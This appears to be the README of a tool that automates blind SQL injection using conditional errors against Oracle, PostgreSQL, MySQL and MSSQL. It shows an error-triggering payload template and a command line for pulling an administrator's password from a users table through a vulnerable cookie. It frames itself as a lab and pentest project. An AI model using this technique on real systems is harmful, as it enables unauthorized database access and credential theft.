# Blind SQL Injection — Conditional Errors Automation

This module implements an automated extractor for **Blind SQL Injection using conditional errors**, supporting multiple DBMS engines.

## Overview

This tool automates the exploitation of SQL injection vulnerabilities where:

- No data is directly returned by the application
- The application does not behave differently based on query results
- BUT database errors trigger a detectable response (e.g. HTTP 500)

The extractor leverages this behavior to infer information using **conditional error-based logic**.

## Technique

The core technique relies on conditional SQL queries:

```sql
SELECT CASE 
    WHEN (condition) THEN TO_CHAR(1/0) 
    ELSE NULL 
END FROM dual
```

- TRUE → database error → detectable response
- FALSE → no error

This allows extracting information via binary search.

## Features

- DBMS detection (Oracle, PostgreSQL, MySQL, MSSQL)
- Automated data extraction
- Binary search optimization for efficiency
- Modular payload system
- CLI-based configuration

## Project Structure

```bash
automation/
├── extractor.py        # Core extraction engine
├── dbms_profiles.py   # Payload definitions per DBMS
├── cli.py             # Argument parsing
└── main.py            # Entry point
```

## Usage

```bash
python main.py \
  --url https://target.com \
  --cookie-vulnerable trackingID\
  --session cookiesession\
  --dbms oracle \
  --table users \
  --col-user username \
  --col-pass password \
  --user administrator
```
or 

```bash
python main.py \
```

## What This Demonstrates

- Blind SQL Injection exploitation
- Error-based inference techniques
- DBMS-specific payload construction
- Automation of manual attack workflows

## Disclaimer

This tool is intended for **educational purposes only** and must be used in authorized environments such as labs, CTFs, or penetration tests with explicit permission.
